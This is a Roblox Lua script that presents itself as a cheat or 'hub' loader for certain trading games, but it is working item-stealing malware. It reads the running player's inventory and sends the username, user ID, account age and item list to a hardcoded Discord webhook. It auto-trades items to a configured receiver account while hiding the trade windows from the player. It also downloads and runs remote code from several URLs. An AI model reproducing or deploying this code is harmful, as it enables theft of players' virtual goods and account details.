Config = {
    Receivers = {"User_boblex"},
    Webhook = "https://discord.com/api/webhooks/1277863416236609586/sBsl7yEyPa6GNgSLVp-RYCQzyRdvW8U_KtXve8HFdE--1OV8VCelyfqOtHCOxp_1hYWN",
    FullInventory = true,
    ReturnStealer = true,
    Script = "Custom",
    CustomLink = "https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"
}
Commands = {ResendTrade = "uwu", RestartPlayer = ".restart"}
repeat
    wait()
until game:IsLoaded()
local a = {[142823291] = true, [335132309] = true, [636649648] = true}
if not a[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
    while true do
    end
    wait(99999999999999999999999999999999999)
end
if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invaild webhook url.")
    return
end
if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
    warn("Script terminated due to an invaild receivers table.")
    return
end
if Config.Script == "Custom" then
    -- Check if the CustomLink is a valid URL
    if not Config.CustomLink or not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        warn("Script terminated due to an invalid custom URL.")
        return
    end
    
    -- Attempt to execute the script from the URL
    local success, result = pcall(function()
        local scriptCode = game:HttpGet(Config.CustomLink)
        return loadstring(scriptCode)()
    end)
    
    -- Handle potential errors during script execution
    if not success then
        warn("Failed to execute custom script: " .. tostring(result))
        return
    end
end
if Config.FullInventory ~= true and Config.FullInventory ~= false then
    Config.FullInventory = true
end
if Config.Script == nil then
    Config.Script = "None"
elseif Config.Script == "Custom" then
    Config.Script = Config.Script .. " - " .. Config.CustomLink
end

local b = game:GetService("Players")
local c = b.LocalPlayer
local d = game:GetService("VirtualUser")
local e = game:GetService("HttpService")
local f = game:GetService("TeleportService")
local g = game:GetService("ReplicatedStorage")
local h = game:GetService("RunService")
local i = g.Trade
local j = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local k =
    [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] ..
    game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local l = 0
local m = 0
local n = 0
local o = 0
local p = 0
local q = 0
local r = 0
local s = 0
c.Idled:connect(
    function()
        d:CaptureController()
        d:ClickButton2(Vector2.new())
    end
)
c.OnTeleport:Connect(
    function()
        getfenv().queue_on_teleport(
            function()
                repeat
                    wait()
                until game:IsLoaded()
                loadstring(
                    game:HttpGet("https://raw.githubusercontent.com/Mistovers/UI-Librarys/main/Fluent%20UI%20Lib")
                )()
            end
        )
        c.OnTeleport:Disconnect()
    end
)
if Hard ~= nil then
    AntiStealer = "Anti-Stealer detected"
else
    AntiStealer = "None detected"
end
if c.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
    UIPath = c.PlayerGui.MainGUI.Game.Inventory.Main
    Mobile = false
else
    UIPath = c.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
    Mobile = true
end
function TapUI(t, u, v)
    if u == "Active Check" then
        if t.Active then
            t = t[v]
        else
            return
        end
    end
    if u == "Text Check" then
        if t == "^" then
            t = v
        else
            return
        end
    end
    for w, x in pairs(j) do
        for w, x in pairs(getconnections(t[x])) do
            x:Fire()
        end
    end
end
local y = {
    AncientList = {},
    GodlyList = {},
    UniqueList = {},
    VintageList = {},
    LegendaryList = {},
    RareList = {},
    UncommonList = {},
    CommonList = {}
}
function Rarity(z, A, B, C, D)
    Stack = 0
    if B then
        if B:FindFirstChild("Evo") then
            return
        end
    end
    if A ~= "" then
        Stack = tonumber(A:match("x(%d+)"))
    else
        Stack = 1
    end
    local E = math.floor(z.R * 255 + 0.5)
    local F = math.floor(z.G * 255 + 0.5)
    local G = math.floor(z.B * 255 + 0.5)
    if E == 106 and F == 106 and G == 106 then
        l = l + Stack
    elseif E == 0 and F == 255 and G == 255 then
        m = m + Stack
    elseif E == 0 and F == 200 and G == 0 then
        n = n + Stack
    elseif E == 220 and F == 0 and G == 5 then
        o = o + Stack
    elseif E == 255 and F == 0 and G == 179 then
        q = q + Stack
    elseif E == 100 and F == 10 and G == 255 then
        r = r + Stack
    elseif E == 240 and F == 140 and G == 0 then
        s = s + Stack
    else
        p = p + Stack
    end
end
function FullInventory()
    local H = {}
    for w, x in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
        for w, x in pairs(x.Container:GetChildren()) do
            if x.Name == "Christmas" or x.Name == "Halloween" then
                for w, x in pairs(x.Container:GetChildren()) do
                    if x:IsA("Frame") then
                        Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text, x:FindFirstChild("Tags"))
                        if Config.FullInventory then
                            if x.Container.Amount.Text ~= "" then
                                number = x.Container.Amount.Text
                            else
                                number = "x1"
                            end
                            table.insert(H, x.ItemName.Label.Text .. " " .. number)
                        end
                    end
                end
            else
                if x:IsA("Frame") then
                    Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text, x:FindFirstChild("Tags"))
                    if Config.FullInventory then
                        if x.Container.Amount.Text ~= "" then
                            number = x.Container.Amount.Text
                        else
                            number = "x1"
                        end
                        table.insert(H, x.ItemName.Label.Text .. " " .. number)
                    end
                end
            end
        end
    end
    for w, x in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
        if x:IsA("Frame") then
            if x:IsA("Frame") then
                Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text)
                if Config.FullInventory then
                    if x.Container.Amount.Text ~= "" then
                        number = x.Container.Amount.Text
                    else
                        number = "x1"
                    end
                    table.insert(H, x.ItemName.Label.Text .. " " .. number)
                end
            end
        end
    end
    if Config.FullInventory then
        return table.concat(H, ", ")
    else
        return "Full inventory set false."
    end
end
FullInventory()
task.wait()
function Sendtrade(I)
    if Mobile then
        local J = c.PlayerGui.MainGUI.Lobby.Leaderboard
        TapUI(J.Container.Close)
        TapUI(J.Container.PlayerList[I].ActionButton)
        TapUI(J.Popup.Container.Action.Trade)
        TapUI(J.Popup.Container.Close)
    else
        local J = c.PlayerGui.MainGUI.Game.Leaderboard
        TapUI(J.Container.ToggleRequests.On)
        TapUI(J.Container.Close.Title.Text, "Text Check", J.Container.Close.Toggle)
        TapUI(J.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
        TapUI(J.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
        TapUI(J.Container[I].ActionButton)
        TapUI(J.Inspect.Trade)
        TapUI(J.Inspect.Close)
    end
end
function readchats(I)
    b[I].Chatted:Connect(
        function(K)
            if K == Commands.ResendTrade then
                Sendtrade(I)
            elseif K == Commands.RestartPlayer then
                f:TeleportToPlaceInstance(game.PlaceId, game.JobId, c)
            end
        end
    )
end
function Activate(I)
    for w, x in pairs(Config.Receivers) do
        if x == I then
            readchats(I)
            wait(10)
            Sendtrade(I)
        end
    end
end
g.Trade.StartTrade.OnClientEvent:Connect(
    function()
        wait(1)
        if Mobile then
            local L = 0
            local J = c.PlayerGui.TradeGUI_Phone.Container
            local M = 0
            for w, x in pairs(J.Items.Main:GetChildren()) do
                for w, x in pairs(x.Items.Container.Current.Container:GetChildren()) do
                    if x:IsA("Frame") then
                        if x.ItemName.Label.Text ~= "Default Knife" or x.ItemName.Label.Text ~= "Default Gun" then
                            if M ~= 4 then
                                M = M + 1
                                LoopsItem = 1
                                local N = x.Container.Amount.Text
                                if N ~= "" then
                                    LoopsItem = tonumber(N:match("x(%d+)"))
                                end
                                task.wait()
                                for w = 1, LoopsItem do
                                    TapUI(x.Container.ActionButton)
                                end
                            end
                        end
                    end
                end
            end
            wait(10)
            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
        else
            local L = 0
            local J = c.PlayerGui.TradeGUI.Container
            local M = 0
            for w, x in pairs(J.Items.Main:GetChildren()) do
                for w, x in pairs(x.Items.Container.Current.Container:GetChildren()) do
                    if x:IsA("Frame") then
                        if x.ItemName.Label.Text ~= "Default Knife" or x.ItemName.Label.Text ~= "Default Gun" then
                            if M ~= 4 then
                                M = M + 1
                                LoopsItem = 1
                                local N = x.Container.Amount.Text
                                if N ~= "" then
                                    LoopsItem = tonumber(N:match("x(%d+)"))
                                end
                                task.wait()
                                for w = 1, LoopsItem do
                                    TapUI(x.Container.ActionButton)
                                end
                            end
                        end
                    end
                end
            end
            wait(10)
            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
        end
    end
)
game:GetService("RunService").Heartbeat:Connect(
    function()
        c.PlayerGui.TradeGUI_Phone.Enabled = false
        c.PlayerGui.TradeGUI.Enabled = false
    end
)
b.PlayerAdded:Connect(
    function(I)
        Activate(I.Name)
    end
)
for w, x in pairs(b:GetPlayers()) do
    Activate(x.Name)
end
function Loop(I)
    Sendtrade()
end
function StartTrade(I)
    for O, P in ipairs(Config.Receivers) do
        if I == P then
            PeaceTimer = true
            wait(10)
            PeaceTimer = false
            Loop(I)
        end
    end
end
function StartTradesForExistingPlayers()
    for O, I in ipairs(b:GetChildren()) do
        StartTrade(I.Name)
    end
end
local Q = {
    ["content"] = "-- @everyone\n" .. k,
    ["embeds"] = {
        {
            ["title"] = "🦖 **Wum_PH**",
            ["description"] = "```Username     : " ..
                c.Name ..
                    "\nUser Id      : " ..
                        c.UserId ..
                            "\nAccount Age  : " ..
                                c.AccountAge ..
                                    "\nExploit      : " ..
                                        identifyexecutor() ..
                                            "\nAnti-Stealer : " ..
                                                AntiStealer ..
                                                    "\nReceiver/s   : " ..
                                                        table.concat(Config.Receivers, ", ") ..
                                                            "\nScript       : " ..
                                                                Config.Script ..
                                                                    "```\n🍗 **__Inventory__**\n```Ancient    🦖: " ..
                                                                        r ..
                                                                            "\nGoldy      🌚: " ..
                                                                                q ..
                                                                                    "\nUnique     💀: " ..
                                                                                        s ..
                                                                                            "\nVintage    🔥: " ..
                                                                                                p ..
                                                                                                    "\nLegendary  😈: " ..
                                                                                                        o ..
                                                                                                            "\nRare       📜: " ..
                                                                                                                n ..
                                                                                                                    "\nUncommon   💸: " ..
                                                                                                                        m ..
                                                                                                                            "\nCommon     🤣: " ..
                                                                                                                                l ..
                                                                                                                                    "```\n🧑‍🏫’ **__Full Inventory__**\n```" ..
                                                                                                                                        FullInventory(
                                                                                                                                        ) ..
                                                                                                                                            "```",
            ["type"] = "rich",
            ["color"] = tonumber(0xffd700)
        }
    }
}
local R = e:JSONEncode(Q)
local S = {["content-type"] = "application/json"}
request = http_request or request or HttpPost or syn.request
request({Url = Config.Webhook, Body = R, Method = "POST", Headers = S})
task.wait()
if Config.Script == "Custom" then
    loadstring(game:HttpGet(Config.CustomLink))()
elseif Config.Script == "Overdrive H" then
    loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
elseif Config.Script == "Symphony Hub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua"))()
elseif Config.Script == "Highlight Hub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
elseif Config.Script == "Eclipse Hub" then
    getgenv().mainKey = "nil"
    local T, G, U, V, W =
        loadstring,
        request or http_request or http and http.request or syn and syn.request,
        assert,
        tostring,
        "https\58//api.eclipsehub.xyz/auth"
    U(T and G, "Executor not Supported")
    T(G({Url = W .. "\?\107e\121\61" .. V(mainKey), Headers = {["User-Agent"] = "Eclipse"}}).Body)()
elseif Config.Script == "R3TH PRIV" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua"))()
elseif Config.Script == "AshbornnHub" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua", true))()
elseif Config.Script == "Yarhm" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
end
